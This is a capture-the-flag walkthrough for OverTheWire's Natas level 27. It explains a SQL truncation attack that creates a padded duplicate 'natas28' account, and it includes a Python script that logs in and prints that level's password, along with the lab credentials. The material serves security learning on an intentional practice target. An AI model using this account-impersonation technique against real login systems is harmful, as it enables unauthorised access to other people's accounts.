# Natas Level 27

> Username: natas27

> Password: mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV

> URL: http://natas27.natas.labs.overthewire.org

## Solution

Entering the URL, we found a login page. We can create new users if it doesn't exist, but if exists like the user `natas28` we must enter a password. So let's view the source code to understand how this work.

```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>
```

The main weaknesses is:

```php
CREATE TABLE users (
    username varchar(64) DEFAULT NULL,
    password varchar(64) DEFAULT NULL
);
```

There is no `UNIQUE` constraint on `username`.
That means the database can contain multiple users with the same username.

And also:

```php
$user = mysqli_real_escape_string(
    $link,
    substr($usr, 0, 64)
);
```

This truncates the username to 64 characters before inserting it into the database.
MySQL commonly uses a collation that ignores trailing spaces when comparing strings.

So our goal is to create a username that doesn't match `natas28` when the application initially checks it.
Gets truncated to `natas28` followed by spaces when inserted.
Is subsequently considered equal to `natas28` by MySQL.

But there's a problem: `createUser()` contains a check:

```php
if($usr != trim($usr)) {
    echo "Go away hacker";
    return False;
}
```

We cannot simply send `natas28` followed by spaces, because `trim()` would remove them.

The solution here is to append one extra character after the spaces. `natas28[57 spaces]X`

So what happens?
1/ `validUser()` checks the complete username, including `spaces and X`. It doesn't find an existing account.
2/ `createUser()` checks `trim()`. Because the username ends in `X`, it passes.
3/ `substr($usr, 0, 64)` removes the final `X`.
4/ MySQL stores `natas28` followed by 57 spaces.
5/ MySQL considers this username equivalent to `natas28` in ordinary comparisons.

And that's it now we can start our exploit. First by creating the malicious username.

```shell
python3 -c 'print("natas28" + " " * 57 + "X")'
```

```text
natas28                                                         X
```

Then we can use it with any password we want. This will create the account. After that we need to login again with the same user but without the last character `X`.

Or let's automate the exploit for better learning.

```python
import requests

url = "http://natas27.natas.labs.overthewire.org/"

auth = (
    "natas27",
    "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV"
)

password = "password"

session = requests.Session()

# Create a duplicate natas28 account
register_username = "natas28" + " " * 57 + "X"

r = session.post(
    url,
    auth=auth,
    data={
        "username": register_username,
        "password": password
    }
)

print("[+] Registration:")
print(r.text)

# Login using the padded username
login_username = "natas28" + " " * 57

r = session.post(
    url,
    auth=auth,
    data={
        "username": login_username,
        "password": password
    }
)

print("[+] Login:")
print(r.text)
```

```text
[username] =&gt; natas28
[password] =&gt; Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3
```

```text
Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3
```

